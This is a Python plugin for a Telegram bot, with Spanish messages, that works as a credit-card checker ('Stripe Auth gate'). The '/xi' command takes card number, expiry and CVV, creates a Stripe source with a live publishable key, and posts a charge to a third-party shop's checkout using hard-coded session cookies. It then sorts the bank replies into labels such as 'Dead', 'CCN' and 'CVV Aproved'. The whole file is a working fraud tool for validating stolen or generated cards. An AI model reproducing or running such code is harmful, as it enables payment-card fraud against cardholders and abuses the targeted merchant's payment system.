import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from datos import idchat

@Client.on_message(filters.command(["xi"], ["/", "."]))
async def xi(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/xi card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/xi card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()
            req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()
            bina = req['bin']
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚ Stripe | Auth Xilicio
Card: <code>{ccs}</code>
Progress 🔴 1.0(s)</b>""")

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            data = f'type=card&owner[name]=fgddffdgg+gfgd&owner[email]=fdfdgdgd%40gmail.com&owner[phone]=954251452&owner[address][line1]=strate+345+calle+12&owner[address][line2]=srearr233&owner[address][city]=ny&owner[address][state]=New+York&owner[address][postal_code]=10020&owner[address][country]=United+States&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&muid=b52883e4-4017-4874-82b3-0ca49d242f123aadb8&sid=f121fb42-125a-4220-b4eb-c0f9f5bb72a4c60af7&pasted_fields=number&payment_user_agent=stripe.js%2F298ab088c%3B+stripe-js-v3%2F298ab088c&time_on_page=40919&key=pk_live_tv1VLJLEMG55LcFQau5LoRnb00hlWgG1vf'

            res = session.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
            json_first = json.loads(res.text)
            if 'error' in json_first:
                text = f"""
<b><b>⎚ <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>                             Dead 

ϟ 𝑪𝒂𝒓𝒅: <code>{ccs}</code>
ϟ 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Incorrecto Card | mal gen</code>
ϟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Decline ❌
ϟ 𝐆𝐚𝐭𝐞 <code>Stripe Auth</code>
━━━━━━𝐁𝐚𝐧𝐤 𝐃𝐞𝐭𝐚𝐢𝐥𝐬━━━━━━━━
ϟ 𝐏𝐚𝐢𝐬: <code>{country_flag} {country}|{country_name}</code>
ϟ 𝐃𝐚𝐭𝐞: <code>{brand}-{typea}-{level}</code>
ϟ 𝐁𝐚𝐧𝐤: <code>{bank}</code>
━━━━━━━𝑶𝒕𝒉𝒆𝒓 𝑫𝒆𝒕𝒂𝒊𝒍𝒔━━━━━━━━
ϟ 𝐏𝐫𝐨𝐱𝐲: Live!✅
ϟ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: <code>8.81 (s) </code>
『𝘋𝘦𝘝  ↯』 <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>
</b> 
"""
                await msg.edit_text(text)
            elif 'id' not in json_first:
                text = f"""
<b><b>⎚ <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>                             Dead 

ϟ 𝑪𝒂𝒓𝒅: <code>{ccs}</code>
ϟ 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Incorrecto Card | mal gen</code>
ϟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Decline ❌
ϟ 𝐆𝐚𝐭𝐞 <code>Stripe Auth</code>
━━━━━━𝐁𝐚𝐧𝐤 𝐃𝐞𝐭𝐚𝐢𝐥𝐬━━━━━━━━
ϟ 𝐏𝐚𝐢𝐬: <code>{country_flag} {country}|{country_name}</code>
ϟ 𝐃𝐚𝐭𝐞: <code>{brand}-{typea}-{level}</code>
ϟ 𝐁𝐚𝐧𝐤: <code>{bank}</code>
━━━━━━━𝑶𝒕𝒉𝒆𝒓 𝑫𝒆𝒕𝒂𝒊𝒍𝒔━━━━━━━━
ϟ 𝐏𝐫𝐨𝐱𝐲: Live!✅
ϟ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: <code>8.81 (s) </code>
『𝘋𝘦𝘝 ↯』 <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>
</b> 
"""
                await msg.edit_text(text)
            else:
                idw = json_first["id"]
                
            #idw= res['id']
           

            #await message.reply(idw)
                msg1=await msg.edit(f"""<b>⎚ Stripe | Auth Xilicio
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")

                cookies = {
                    'PHPSESSID': '8dh5btrfaogjqjikoalfcg3va1',
                    'default': 'an4ib6h5soieko2ekrcrjueip6',
                    'language': 'en-gb',
                    'currency': 'USD',
                    '__stripe_mid': 'b52883e4-4017-4874-82b3-0ca49d242f123aadb8',
                    '__stripe_sid': 'f121fb42-125a-4220-b4eb-c0f9f5bb72a4c60af7',
                }

                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'es-ES,es;q=0.9',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    # 'Cookie': 'PHPSESSID=8dh5btrfaogjqjikoalfcg3va1; default=an4ib6h5soieko2ekrcrjueip6; language=en-gb; currency=USD; __stripe_mid=b52883e4-4017-4874-82b3-0ca49d242f123aadb8; __stripe_sid=f121fb42-125a-4220-b4eb-c0f9f5bb72a4c60af7',
                    'Origin': 'https://www.primitivegatherings.us',
                    'Referer': 'https://www.primitivegatherings.us/checkout',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }

                data = {
                    'source': idw,
                    'addresses': '',
                    'store_card': 'false',
                    'embed': '0',
                }

                response1 = requests.post('https://www.primitivegatherings.us/index.php?route=extension/payment/stripe/chargeSource',headers=headers,data=data)
                

                msg2=await msg1.edit(f"""<b>⎚ Stripe | Auth Xilicio
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")

                if 'Your card was declined.' in response1.text:
                    await msg2.edit(f"""<b><b>⎚ <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>                             Dead 

ϟ 𝑪𝒂𝒓𝒅: <code>{ccs}</code>
ϟ 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Your cc was declined</code>
ϟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Decline ❌
ϟ 𝐆𝐚𝐭𝐞 <code>Stripe Auth</code>
━━━━━━𝐁𝐚𝐧𝐤 𝐃𝐞𝐭𝐚𝐢𝐥𝐬━━━━━━━━
ϟ 𝐏𝐚𝐢𝐬: <code>{country_flag} {country}|{country_name}</code>
ϟ 𝐃𝐚𝐭𝐞: <code>{brand}-{typea}-{level}</code>
ϟ 𝐁𝐚𝐧𝐤: <code>{bank}</code>
━━━━━━━𝑶𝒕𝒉𝒆𝒓 𝑫𝒆𝒕𝒂𝒊𝒍𝒔━━━━━━━━
ϟ 𝐏𝐫𝐨𝐱𝐲: Live!✅
ϟ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: <code>8.81 (s) </code>
『𝘋𝘦𝘝  ↯』 <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>
 </b> """)
                    
                elif"Your card's security code is incorrect." in response1.text:
                    await msg2.edit(f"""<b>⎚ <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>                             CCN 

ϟ 𝑪𝒂𝒓𝒅: <code>{ccs}</code>
ϟ 𝐒𝐭𝐚𝐭𝐮𝐬: incorrect_cvc
ϟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:<code>Your cards security code is incorrect</code>✅
ϟ 𝐆𝐚𝐭𝐞 <code>Stripe Auth</code>
━━━━━━𝐁𝐚𝐧𝐤 𝐃𝐞𝐭𝐚𝐢𝐥𝐬━━━━━━━━
ϟ 𝐏𝐚𝐢𝐬: <code>{country_flag} {country}| {country_name}</code>
ϟ 𝐃𝐚𝐭𝐞: <code>{brand}-{typea}-{level}</code>
ϟ 𝐁𝐚𝐧𝐤: <code>{bank}</code>
━━━━━━━𝑶𝒕𝒉𝒆𝒓 𝑫𝒆𝒕𝒂𝒊𝒍𝒔━━━━━━━━
ϟ 𝐏𝐫𝐨𝐱𝐲: Live!✅
ϟ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: <code>8.81 (s) </code>
『𝘋𝘦𝘝  ↯』 <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>
                    </b>
                    """)
                elif 'Your card has insufficient funds.' in response1.text:
                    await msg2.edit(f"""<b><b>⎚ <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>                           INFUNDS 

ϟ 𝑪𝒂𝒓𝒅: <code>{ccs}</code>
ϟ 𝐒𝐭𝐚𝐭𝐮𝐬: Provado ✅
ϟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Your card has insufficient funds✅
ϟ 𝐆𝐚𝐭𝐞 <code>Stripe Auth</code>
━━━━━━𝐁𝐚𝐧𝐤 𝐃𝐞𝐭𝐚𝐢𝐥𝐬━━━━━━━━
ϟ 𝐏𝐚𝐢𝐬: <code>{country_flag} {country}| {country_name}</code>
ϟ 𝐃𝐚𝐭𝐞: <code>{brand}-{typea}-{level}</code>
ϟ 𝐁𝐚𝐧𝐤: <code>{bank}</code>
━━━━━━━𝑶𝒕𝒉𝒆𝒓 𝑫𝒆𝒕𝒂𝒊𝒍𝒔━━━━━━━━
ϟ 𝐏𝐫𝐨𝐱𝐲: Live!✅
ϟ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: <code>8.81 (s) </code>
『𝘋𝘦𝘝  ↯』 <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>
        </b>""")

                elif 'Your card number is incorrect.' in response1.text:
                    await msg2.edit(f"""<b><b>⎚ <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>                             Dead 

ϟ 𝑪𝒂𝒓𝒅: <code>{ccs}</code>
ϟ 𝐒𝐭𝐚𝐭𝐮𝐬: Invalid CardNumber ❌
ϟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Your card number is incorrect.
ϟ 𝐆𝐚𝐭𝐞 <code>Stripe Auth</code>
━━━━━━𝐁𝐚𝐧𝐤 𝐃𝐞𝐭𝐚𝐢𝐥𝐬━━━━━━━━
ϟ 𝐏𝐚𝐢𝐬: <code>{country_flag} {country}| {country_name}</code>
ϟ 𝐃𝐚𝐭𝐞: <code>{brand}-{typea}-{level}</code>
ϟ 𝐁𝐚𝐧𝐤: <code>{bank}</code>
━━━━━━━𝑶𝒕𝒉𝒆𝒓 𝑫𝒆𝒕𝒂𝒊𝒍𝒔━━━━━━━━
ϟ 𝐏𝐫𝐨𝐱𝐲: Live!✅
ϟ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: <code>8.81 (s) </code>
『𝘋𝘦𝘝 ↯』 <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>
                    </b> """)

                else:
                    await msg2.edit(f"""<b>⎚ <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>                             CVV 

ϟ 𝑪𝒂𝒓𝒅: <code>{ccs}</code>
ϟ 𝐒𝐭𝐚𝐭𝐮𝐬: Aproved ✅
ϟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Cvv Aproved ✅
ϟ 𝐆𝐚𝐭𝐞 <code>Stripe Auth</code>
━━━━━━𝐁𝐚𝐧𝐤 𝐃𝐞𝐭𝐚𝐢𝐥𝐬━━━━━━━━
ϟ 𝐏𝐚𝐢𝐬: <code>{country_flag} {country}| {country_name}</code>
ϟ 𝐃𝐚𝐭𝐞: <code>{brand}-{typea}-{level}</code>
ϟ 𝐁𝐚𝐧𝐤: <code>{bank}</code>
━━━━━━━𝑶𝒕𝒉𝒆𝒓 𝑫𝒆𝒕𝒂𝒊𝒍𝒔━━━━━━━━
ϟ 𝐏𝐫𝐨𝐱𝐲: Live!✅
ϟ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: <code>8.81 (s) </code>
『𝘋𝘦𝘝  ↯』 <b><a href="tg://resolve?domain=Was_FaReS">ϟ 𝐅𝐚𝐑𝐞𝐒 ϟ</a></b>
                </b>     
        """)
        else:
            return await message.reply(f'<b>⎚ Chat no autorizado | O no eres Premium.</b>')